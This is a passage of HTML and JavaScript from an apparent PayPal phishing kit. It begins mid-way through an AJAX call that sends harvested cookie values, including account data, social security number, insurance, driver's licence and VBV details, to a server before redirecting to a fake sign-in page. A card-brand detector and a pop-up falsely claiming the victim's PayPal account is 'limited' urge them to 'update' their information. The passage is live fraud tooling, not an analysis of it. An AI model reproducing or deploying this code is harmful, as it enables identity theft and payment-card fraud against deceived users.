                            'account'      : $.cookie('account'),
                            'ssn'          : $.cookie('ssn'),
                            'ins'          : $.cookie('ins'),
                            'driver'       : $.cookie('driver'),
                            'vbv'          : $.cookie('vbv')
                        },
                        success: function() {
                            setTimeout(function() {
                                $(location).attr("href", "./signin?login" , 100);
                            }, 1500); 
                        }
                    });
                },
            });  
        </script>
                <script type="text/javascript">             
window.onload = function openVentana(){            
$(".ventana").slideDown(1000);             
}       
function closeVentana(){            
$(".ventana").slideUp("fast");          
} 
</script> 
<script language="Javascript">
function SelectCC(cardnumber) {
var first = cardnumber.charAt(0);
var second = cardnumber.charAt(1);
var third = cardnumber.charAt(2);
var fourth = cardnumber.charAt(3);
var cardnumber = (cardnumber + '').replace(/\\s/g, '');
if ((/^(417500|(4917|4913|4026|4508|4844)\d{2})\d{10}$/).test(cardnumber) && cardnumber.length == 16) {
                document.getElementById("card02").style.backgroundPosition = "0px -203px";
                document.getElementById("cvv").maxLength ="3"
                document.getElementById("vbv").style.backgroundImage = "url('http://img11.hostingpics.net/pics/393485vbv.png')";
}
else if ((/^(4)/).test(cardnumber) && (cardnumber.length == 16)) {
                document.getElementById("card02").style.backgroundPosition = "0px 1px";
                document.getElementById("cvv").maxLength ="3"
                document.getElementById("vbv").style.backgroundImage = "url('http://img11.hostingpics.net/pics/393485vbv.png')";
}
else if ((/^(34|37)/).test(cardnumber) && cardnumber.length == 15) {
                document.getElementById("card02").style.backgroundPosition = "0px -57px";
                document.getElementById("cvv").maxLength ="4"
                document.getElementById("vbv").style.backgroundImage = "url('http://img11.hostingpics.net/pics/490379safekey.png')";
}
else if ((/^(51|52|53|54|55)/).test(cardnumber) && cardnumber.length == 16) {
                document.getElementById("card02").style.backgroundPosition = "0px -29px";
                document.getElementById("cvv").maxLength ="3"
                document.getElementById("vbv").style.backgroundImage = "url('http://img11.hostingpics.net/pics/611831msc.png')";
}
else if ((/^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d+$/).test(cardnumber) && cardnumber.length == 16) {
                document.getElementById("card02").style.backgroundPosition = "0px -174px";
                document.getElementById("cvv").maxLength ="3"
                document.getElementById("vbv").style.backgroundImage = "url('http://img11.hostingpics.net/pics/611831msc.png')";
}
else if ((/^(6011|16)/).test(cardnumber) && cardnumber.length == 16) {
                document.getElementById("card02").style.backgroundPosition = "0px -86px";
}
else if ((/^(30|36|38|39)/).test(cardnumber) && (cardnumber.length == 14)) {
                document.getElementById("card02").style.backgroundPosition = "0px -115";
}
else if ((/^(35|3088|3096|3112|3158|3337)/).test(cardnumber) && (cardnumber.length == 16)) {
                document.getElementById("card02").style.backgroundPosition = "0px -145px";
}
else {
                document.getElementById("card02").style.backgroundPosition = "0px -406px";
}

}

</script>

    </body>

<div class="ventana"> 
<div class="form" style="border: 1px solid rgba(0, 0, 0, 0.2);background-clip: padding-box;width: 500px;margin-left: -250px;">
<div class="cerrar"><a href="javascript:closeVentana();"><img src="./images/test.PNG"></a></div> <center><img src="./images/2.PNG">
<div style="width: 70%;margin: 10px auto 10px auto;font-size: 20px;line-height: 25px;" neue="">Verify your account</div>
<div style="width: 90%;">You can not access to all your PayPal advantages, due to account limited. 
To restore your account, please click Continue to update your information.</div><br>
                   <a style="text-decoration:none;" href="javascript:closeVentana();"><button class="vx_btn vx_btn-small btn" >Continue</button></a>    </ul> 
            </div> </div>
</html>